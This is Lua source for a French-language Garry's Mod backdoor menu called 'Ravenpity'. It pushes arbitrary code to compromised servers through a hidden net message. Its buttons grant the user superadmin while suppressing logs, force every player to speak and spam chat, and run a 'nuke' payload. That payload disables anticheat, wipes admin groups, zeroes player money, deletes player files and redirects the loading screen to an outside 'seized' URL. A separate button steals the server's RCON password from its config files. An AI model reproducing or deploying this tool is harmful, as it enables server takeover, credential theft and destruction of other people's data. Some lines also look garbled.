draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButton:SetTextColor( Color( 255, 255, 255 ) )        
end
CloseButton.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
BaseHeader:Remove()
end
end

/*======================================================================================================================================================================================
Player Options
========================================================================================================================================================================================*/
function RAVEN.PlayerOptions()
if RAVEN.PlayerOptionsListe and RAVEN.PlayerOptionsListe:IsVisible() then RAVEN.PlayerOptionsListe:Remove() end
RAVEN.PlayerOptionsListe = vgui.Create("DFrame")
RAVEN.PlayerOptionsListe:SetSize(682,350)
RAVEN.PlayerOptionsListe:SetTitle("")
RAVEN.PlayerOptionsListe:SetPos( 342, 250 )
RAVEN.PlayerOptionsListe:MakePopup()
RAVEN.PlayerOptionsListe:ShowCloseButton( false ) 
RAVEN.PlayerOptionsListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonPlayerOptions = vgui.Create( "DButton", BackgroundSupportPanel)
CloseButtonPlayerOptions:SetPos( 0, 370)
CloseButtonPlayerOptions:SetSize( 400, 30  )
CloseButtonPlayerOptions:SetText( "X" )
CloseButtonPlayerOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonPlayerOptions:IsHovered() then
CloseButtonPlayerOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonPlayerOptions:SetTextColor( Color( 255, 255, 255 ) )       
end
CloseButtonPlayerOptions.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
BaseHeader:Remove()
end
end
local   ReturnButtonPlayerOptions = vgui.Create( "DButton", BackgroundSupportPanel)
ReturnButtonPlayerOptions:SetPos( 0, 340)
ReturnButtonPlayerOptions:SetSize( 400, 30  )
ReturnButtonPlayerOptions:SetText( "<--" )
ReturnButtonPlayerOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonPlayerOptions:IsHovered() then
ReturnButtonPlayerOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonPlayerOptions:SetTextColor( Color( 255, 255, 255 ) )        
end
ReturnButtonPlayerOptions.DoClick = function()
BaseHeader:Remove()
LocalPlayer():ConCommand("stringraven_backdoor")
end
end

-------------------------------------------------------------------------------------|
local   setsuperadminon = vgui.Create( "DButton", BackgroundSupportPanel)
setsuperadminon:SetPos( 0, 0)
setsuperadminon:SetSize( 400, 30  )
setsuperadminon:SetText( "Se Mettre Superadmin" )
setsuperadminon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if setsuperadminon:IsHovered() then
setsuperadminon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
setsuperadminon:SetTextColor( Color(154, 99, 255) )       
end
setsuperadminon.DoClick = function()
local superadminonsetting = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")
]]
net.Start(ravenhacknetnet)
net.WriteString( superadminonsetting )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vous êtes Superadmin" )
end
end
local   setsuperadminoff = vgui.Create( "DButton", BackgroundSupportPanel)
setsuperadminoff:SetPos( 365, 5)
setsuperadminoff:SetSize( 20, 20  )
setsuperadminoff:SetText( "X" )
setsuperadminoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if setsuperadminoff:IsHovered() then
setsuperadminoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
setsuperadminoff:SetTextColor( Color( 255, 255, 255 ) )       
end
setsuperadminoff.DoClick = function()
local superadminoffsetting = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "removeuserid", "]]..LocalPlayer():SteamID()..[[")
]]
net.Start(ravenhacknetnet)
net.WriteString( superadminoffsetting )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vous n'êtes plus Superadmin" )
end
end

-------------------------------------------------------------------------------------|

local   physicspeedon = vgui.Create( "DButton", BackgroundSupportPanel)
physicspeedon:SetPos( 0, 30)
physicspeedon:SetSize( 400, 30  )
physicspeedon:SetText( "Vitesse PhysicGun" )
physicspeedon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if physicspeedon:IsHovered() then
physicspeedon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
physicspeedon:SetTextColor( Color( 255, 255, 255 ) )        
end
physicspeedon.DoClick = function()
LocalPlayer():ConCommand( "physgun_wheelspeed 3000" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vitesse du PhysicGun augmenté" )
end
end
local   physicspeedoff = vgui.Create( "DButton", BackgroundSupportPanel)
physicspeedoff:SetPos( 365, 35)
physicspeedoff:SetSize( 20, 20  )
physicspeedoff:SetText( "X" )
physicspeedoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if physicspeedoff:IsHovered() then
physicspeedoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
physicspeedoff:SetTextColor( Color( 255, 255, 255 ) )       
end
physicspeedoff.DoClick = function()
LocalPlayer():ConCommand( "physgun_wheelspeed 80" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vitesse du PhysicGun remit par Défault" )
end
end

-------------------------------------------------------------------------------------|

local   changeplayermodelon = vgui.Create( "DButton", BackgroundSupportPanel)
changeplayermodelon:SetPos( 0, 60)
changeplayermodelon:SetSize( 400, 30  )
changeplayermodelon:SetText( "Changer le model des Joueurs" )
changeplayermodelon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if changeplayermodelon:IsHovered() then
changeplayermodelon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
changeplayermodelon:SetTextColor( Color( 255, 255, 255 ) )        
end
changeplayermodelon.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Model des Joueurs changé" )
end
end
local   changeplayermodeloff = vgui.Create( "DButton", BackgroundSupportPanel)
changeplayermodeloff:SetPos( 365, 65)
changeplayermodeloff:SetSize( 20, 20  )
changeplayermodeloff:SetText( "X" )
changeplayermodeloff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if changeplayermodeloff:IsHovered() then
changeplayermodeloff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
changeplayermodeloff:SetTextColor( Color( 255, 255, 255 ) )       
end
changeplayermodeloff.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/Humans/Group01/male_02.mdl\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Model des Joueurs remit par Défault" )
end
end

-------------------------------------------------------------------------------------|

local   ddplayeron = vgui.Create( "DButton", BackgroundSupportPanel)
ddplayeron:SetPos( 0, 90)
ddplayeron:SetSize( 400, 30  )
ddplayeron:SetText( "2d Player" )
ddplayeron.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ddplayeron:IsHovered() then
ddplayeron:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ddplayeron:SetTextColor( Color( 255, 255, 255 ) )       
end
ddplayeron.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[
for k,v in pairs(player.GetAll()) do 
local a = v:LookupBone("ValveBiped.Bip01_Head1")
local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
v:ManipulateBoneScale( a, Vector(4,0,4)) 
v:ManipulateBoneScale( b, Vector(0,0,0))
v:ManipulateBoneScale( c, Vector(0,0,0))
v:ManipulateBoneScale( d, Vector(0,0,1))
v:ManipulateBoneScale( e, Vector(0,0,1))
v:ManipulateBoneScale( f, Vector(0,0,0))
v:ManipulateBoneScale( g, Vector(0,0,0))
v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
v:ManipulateBoneScale( j, Vector(0,0,0))
v:ManipulateBoneScale( k, Vector(0,0,0))
end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "2d Players activé" )
end
end
local   ddplayeroff = vgui.Create( "DButton", BackgroundSupportPanel)
ddplayeroff:SetPos( 365, 95)
ddplayeroff:SetSize( 20, 20  )
ddplayeroff:SetText( "X" )
ddplayeroff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ddplayeroff:IsHovered() then
ddplayeroff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
ddplayeroff:SetTextColor( Color( 255, 255, 255 ) )        
end
ddplayeroff.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[
for k,v in pairs(player.GetAll()) do 
local a = v:LookupBone("ValveBiped.Bip01_Head1")
local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
v:ManipulateBoneScale( a, Vector(1,1,1))
v:ManipulateBoneScale( b, Vector(1,1,1))
v:ManipulateBoneScale( c, Vector(1,1,1))
v:ManipulateBoneScale( d, Vector(1,1,1))
v:ManipulateBoneScale( e, Vector(1,1,1))
v:ManipulateBoneScale( f, Vector(1,1,1))
v:ManipulateBoneScale( g, Vector(1,1,1))
v:ManipulateBoneScale( h, Vector(1,1,1))
v:ManipulateBoneScale( i, Vector(1,1,1))
v:ManipulateBoneScale( j, Vector(1,1,1))
v:ManipulateBoneScale( k, Vector(1,1,1))
end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "2d Players désactivé" )
end
end

-------------------------------------------------------------------------------------|

local   bighead = vgui.Create( "DButton", BackgroundSupportPanel)
bighead:SetPos( 0, 120)
bighead:SetSize( 400, 30  )
bighead:SetText( "Grosse Tete" )
bighead.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if bighead:IsHovered() then
bighead:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
bighead:SetTextColor( Color( 255, 255, 255 ) )        
end
bighead.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[
for k,v in pairs(player.GetAll()) do 
local a = v:LookupBone("ValveBiped.Bip01_Head1")
local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
v:ManipulateBoneScale( a, Vector(100,100,100)) 
v:ManipulateBoneScale( b, Vector(100,100,100))
v:ManipulateBoneScale( c, Vector(100,100,100))
v:ManipulateBoneScale( d, Vector(100,100,100))
v:ManipulateBoneScale( e, Vector(100,100,100))
v:ManipulateBoneScale( f, Vector(100,100,100))
v:ManipulateBoneScale( g, Vector(100,100,100))
v:ManipulateBoneScale( h, Vector(100,100,100))
v:ManipulateBoneScale( i, Vector(100,100,100))
v:ManipulateBoneScale( j, Vector(100,100,100))
v:ManipulateBoneScale( k, Vector(100,100,100))
end]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Grosse tête activé" )
end
end

-------------------------------------------------------------------------------------|

local   giantworld = vgui.Create( "DButton", BackgroundSupportPanel)
giantworld:SetPos( 0, 150)
giantworld:SetSize( 400, 30  )
giantworld:SetText( "Joueurs Géants" )
giantworld.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if giantworld:IsHovered() then
giantworld:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
giantworld:SetTextColor( Color( 255, 255, 255 ) )       
end
giantworld.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
for k,v in pairs (player.GetAll()) do
v:SetModelScale(50.5, 100);
v:SetRunSpeed(400 * 2);
v:SetWalkSpeed(200 * 2);
end
end)]]
net.Start(ravenhacknetnet)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Monde de Géants activé" )
end
end

-------------------------------------------------------------------------------------|

local   minimoysworld = vgui.Create( "DButton", BackgroundSupportPanel)
minimoysworld:SetPos( 0, 180)
minimoysworld:SetSize( 400, 30  )
minimoysworld:SetText( "Joueurs Nains" )
minimoysworld.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if minimoysworld:IsHovered() then
minimoysworld:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
minimoysworld:SetTextColor( Color( 255, 255, 255 ) )        
end
minimoysworld.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
for k,v in pairs (player.GetAll()) do
v:SetModelScale(0.2, 80);
v:SetRunSpeed(400 * 2);
v:SetWalkSpeed(200 * 2);
end
end)]]
net.Start(ravenhacknetnet)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Monde de Nains activé" )
end
end

-------------------------------------------------------------------------------------|

local   runlikeflash = vgui.Create( "DButton", BackgroundSupportPanel)
runlikeflash:SetPos( 0, 210)
runlikeflash:SetSize( 400, 30  )
runlikeflash:SetText( "Courrir Vite" )
runlikeflash.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if runlikeflash:IsHovered() then
runlikeflash:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
runlikeflash:SetTextColor( Color( 255, 255, 255 ) )       
end
runlikeflash.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
for k,v in pairs (player.GetAll()) do
v:SetRunSpeed(400* 4);
v:SetWalkSpeed(200 * 2);
end
end)]]
net.Start(ravenhacknetnet)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Courrir vite activé" )
end
end


-------------------------------------------------------------------------------------|

local   forceplayersay = vgui.Create( "DButton", BackgroundSupportPanel)
forceplayersay:SetPos( 0, 240)
forceplayersay:SetSize( 400, 30  )
forceplayersay:SetText( "Forcer les Joueurs à écrire" )
forceplayersay.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if forceplayersay:IsHovered() then
forceplayersay:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
forceplayersay:SetTextColor( Color( 255, 255, 255 ) )       
end
forceplayersay.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do
v:ConCommand("say Ravenpity <3 (hoperdev.fr)")
end
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tout les Joueurs ont envoyés un Message" )
end
end
end

/*======================================================================================================================================================================================
Server Options
========================================================================================================================================================================================*/
function RAVEN.ServerOptions()
if RAVEN.ServerOptionsListe and RAVEN.ServerOptionsListe:IsVisible() then RAVEN.ServerOptionsListe:Remove() end
RAVEN.ServerOptionsListe = vgui.Create("DFrame")
RAVEN.ServerOptionsListe:SetSize(682,350)
RAVEN.ServerOptionsListe:SetTitle("")
RAVEN.ServerOptionsListe:SetPos( 342, 250 )
RAVEN.ServerOptionsListe:MakePopup()
RAVEN.ServerOptionsListe:ShowCloseButton( false ) 
RAVEN.ServerOptionsListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonServerOptions = vgui.Create( "DButton", BackgroundSupportPanel)
CloseButtonServerOptions:SetPos( 0, 370)
CloseButtonServerOptions:SetSize( 400, 30  )
CloseButtonServerOptions:SetText( "X" )
CloseButtonServerOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonServerOptions:IsHovered() then
CloseButtonServerOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonServerOptions:SetTextColor( Color( 255, 255, 255 ) )       
end
CloseButtonServerOptions.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
BaseHeader:Remove()
end
end
local   ReturnButtonServerOptions = vgui.Create( "DButton", BackgroundSupportPanel)
ReturnButtonServerOptions:SetPos( 0, 340)
ReturnButtonServerOptions:SetSize( 400, 30  )
ReturnButtonServerOptions:SetText( "<--" )
ReturnButtonServerOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonServerOptions:IsHovered() then
ReturnButtonServerOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonServerOptions:SetTextColor( Color( 255, 255, 255 ) )        
end
ReturnButtonServerOptions.DoClick = function()
BaseHeader:Remove()
LocalPlayer():ConCommand("stringraven_backdoor")
end
end

-------------------------------------------------------------------------------------|

local   deleteserv = vgui.Create( "DButton", BackgroundSupportPanel)
deleteserv:SetPos( 0, 0)
deleteserv:SetSize( 400, 30  )
deleteserv:SetText( "Supprimer le Serveur" )
deleteserv.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if deleteserv:IsHovered() then
deleteserv:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
deleteserv:SetTextColor( Color(  255, 86, 86 ) )        
end
deleteserv.DoClick = function()
local nuke = [[
if( LeyAC ) then
LeyAC = nil;
end
timer.Create( "next_level_timer2", 20, 0, function()
--Break some bad cmds
local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
--Break ULX
if ULib then
for k,v in pairs(player.GetAll()) do
ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
end
for k,v in pairs(ULib.ucl.groups) do
if k != "user" then
ULib.ucl.removeGroup(k);
end
end
for k,v in pairs(ULib.ucl.users) do
v.group = "user"
end
end
--Gamemode related
if GAMEMODE.Name == "DarkRP" then
for k,v in pairs(player.GetAll()) do
RunConsoleCommand("rp_setmoney", v:Nick(), 0);
end
hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
end)
end
if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
//for k, v in pairs(player.GetAll()) do
//end
end
if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
for k,v in pairs(player.GetAll()) do
RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
end
hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
end)
local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
for k, v in pairs( fil ) do
file.Delete( fil )
end
end
end)
if GetConVarnet.WriteString("sv_allowcslua") != "0" then
RunConsoleCommand( "sv_allowcslua", "1" );
end
hook.Add("Think", "busted", function()
for k,v in pairs (player.GetAll()) do
v:SetModelScale(2.5, 100);
v:SetRunSpeed(400 * 2);
v:SetWalkSpeed(200 * 2);
end
end)
timer.Create( "next_level_timer", 5, 0, function()
for k, v in pairs(player.GetAll()) do
v:ConCommand("say 亗 https://steamcommunity.com/id/hxpxr 亗");
end
end)
RunConsoleCommand("hostname", "SERVER HACK LEL")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(ravenhacknetnet)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Suppression en cours... Les effets seront visibles après le Reboot" )
end
end

-------------------------------------------------------------------------------------| 

local   rconstealer = vgui.Create( "DButton", BackgroundSupportPanel)
rconstealer:SetPos( 0, 30)
rconstealer:SetSize( 400, 30  )
rconstealer:SetText( "Rcon Stealer" )
rconstealer.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if rconstealer:IsHovered() then
rconstealer:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
rconstealer:SetTextColor( Color(154, 99, 255) )       
end
rconstealer.DoClick = function()
local rcon = [[
util.AddNetworkString("rcon_passw_dump")
util.AddNetworkString("jeveuttonrconleul")
util.AddNetworkString("aucun_rcon_ici")
net.Receive( "jeveuttonrconleul", function()
local RconPassword
if file.Exists("cfg/server.cfg", "GAME") then
	for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
		if string.find(v, "rcon_password") then
			RconPassword = v
		end
	end
end
if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
	for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
		if string.find(v, "rcon_password") then
			RconPassword = v
		end
	end
end
if RconPassword ~= nil then
	net.Start("rcon_passw_dump")
	net.WriteString(RconPassword)
	net.Broadcast()
	else
	net.Start("aucun_rcon_ici")
	net.Broadcast()
end
end)
]]
net.Start(ravenhacknetnet)
net.WriteString( rcon )
net.WriteBit (1)
net.SendToServer()
timer.Simple( 0.5, function()
if RAVEN.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "RCON PASSWORD non-trouvé, veuillez réessayer" )
end
end)
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), rcon_pass, Color(0, 255, 0)," RCON PASSWORD trouvé")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Aucun RCON PASSWORD ici" )
end )
end

-------------------------------------------------------------------------------------|

local   spamchaton = vgui.Create( "DButton", BackgroundSupportPanel)
spamchaton:SetPos( 0, 60)
spamchaton:SetSize( 400, 30  )
spamchaton:SetText( "Spam le Chat" )
spamchaton.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spamchaton:IsHovered() then
spamchaton:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
spamchaton:SetTextColor( Color(154, 99, 255) )        
end
spamchaton.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString("timer.Create( \"rekt\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"♣♣♣♣ SERVER HACKED BY RAVENPITY ! ♣♣♣♣\")]]) end)")
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Chat activé" )
end
end
local   spamchatoff = vgui.Create( "DButton", BackgroundSupportPanel)
spamchatoff:SetPos( 365, 65)
spamchatoff:SetSize( 20, 20  )
spamchatoff:SetText( "X" )
spamchatoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if spamchatoff:IsHovered() then
spamchatoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
spamchatoff:SetTextColor( Color( 255, 255, 255 ) )        
end
spamchatoff.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString("timer.Stop( \"rekt\")")
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Chat désactivé" )
end
end

-------------------------------------------------------------------------------------|

